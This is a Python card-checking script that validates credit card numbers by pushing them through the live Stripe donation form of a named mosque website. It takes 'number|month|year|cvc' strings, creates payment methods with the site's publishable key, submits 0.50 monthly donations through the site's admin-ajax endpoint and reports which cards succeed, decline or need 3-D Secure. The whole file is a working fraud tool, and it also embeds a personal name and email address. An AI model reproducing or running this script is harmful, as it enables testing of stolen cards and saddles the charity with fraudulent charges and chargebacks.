import requests
import json
import time
import random
import string
from user_agent import generate_user_agent
#from proxy import reqproxy, make_request
import json
import re
# Fixed cookies – no file I/O

session = requests.session()

def Tele(ccx):
    """
    Process a credit card against toledomasjid.com Stripe gateway.
    Returns a string message: success, decline, error, or 3DS required.
    """
    try:
        ccx = ccx.strip()
        n = ccx.split("|")[0]
        mm = ccx.split("|")[1]
        yy = ccx.split("|")[2]
        cvc = ccx.split("|")[3]
        if "20" in yy:
            yy = yy.split("20")[1]
        r = session

        # Step 1: Create payment method
        headers = {
            'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        }
        data = f'type=card&billing_details[name]=Yangkhim+ira&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&payment_user_agent=stripe.js%2F668865867f%3B+stripe-js-v3%2F668865867f%3B+card-element&referrer=https%3A%2F%2Fwww.toledomasjid.com&key=pk_live_elzPHGYjH2mr8aR71OFcfEg000ha2pNIVQ'

        response = r.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
        # No cookies.txt write – cookies already set
        
        res_json = response.json()
        
        # Check for error in payment method creation
        if 'error' in res_json:
            error_msg = res_json['error'].get('message', 'Unknown error')
            return f"Card error: {error_msg}"
        
        pm = res_json.get('id')
        if not pm:
            return "Payment method creation failed: No ID returned"

        # Step 2: Submit donation (cookies already set)
        cookies = {
            '_gid': 'GA1.2.1034910260.1787247306',
    '_ga_B9SJDZYP4B': 'GS2.1.s1787247306$o1$g0$t1787247306$j60$l0$h0',
    '_ga': 'GA1.1.1744358948.1787247306',
    '__stripe_mid': '761d38ac-e40c-4a6b-bc11-e1053814548fe96153',
    '__stripe_sid': 'a5134da0-32b9-4c7a-9f96-f71062442f95234bc1',
        }

        headers = {
            'authority': 'www.toledomasjid.com',
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': '_gid=GA1.2.1034910260.1787247306; _ga_B9SJDZYP4B=GS2.1.s1787247306$o1$g0$t1787247306$j60$l0$h0; _ga=GA1.1.1744358948.1787247306; __stripe_mid=761d38ac-e40c-4a6b-bc11-e1053814548fe96153; __stripe_sid=a5134da0-32b9-4c7a-9f96-f71062442f95234bc1',
    'origin': 'https://www.toledomasjid.com',
    'referer': 'https://www.toledomasjid.com/monthlydonation/',
    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
        }
        data = {
            'action': 'wp_full_stripe_inline_donation_charge',
    'wpfs-form-name': 'testdonation',
    'wpfs-form-get-parameters': '%7B%7D',
    'wpfs-custom-amount': 'other',
    'wpfs-custom-amount-unique': '0.50',
    'wpfs-donation-frequency': 'monthly',
    'wpfs-card-holder-email': 'yangkhimrai20@gmail.com',
    'wpfs-card-holder-name': 'Yangkhim ira',
    'wpfs-stripe-payment-method-id': f'{pm}',
        }
        response = r.post('https://www.toledomasjid.com/wp-admin/admin-ajax.php', cookies=cookies, headers=headers, data=data)
        
        result_data = response.json()
        
        # Check for error in donation step
        if 'error' in result_data:
            error_msg = result_data['error'].get('message', str(result_data['error']))
            if 'needs additional action' in error_msg or '3d_secure' in error_msg.lower():
                return "The donation needs additional action before completion!"
            return f"Donation error: {error_msg}"
        
        if 'message' in result_data:
            return result_data['message']
        elif 'success' in result_data and result_data['success']:
            return "Donation Successful!"
        else:
            return f"Unexpected response: {result_data}"
            
    except requests.exceptions.Timeout:
        return "Error: Request timeout"
    except requests.exceptions.ConnectionError:
        return "Error: Connection failed"
    except Exception as e:
        return f"Error: {str(e)}"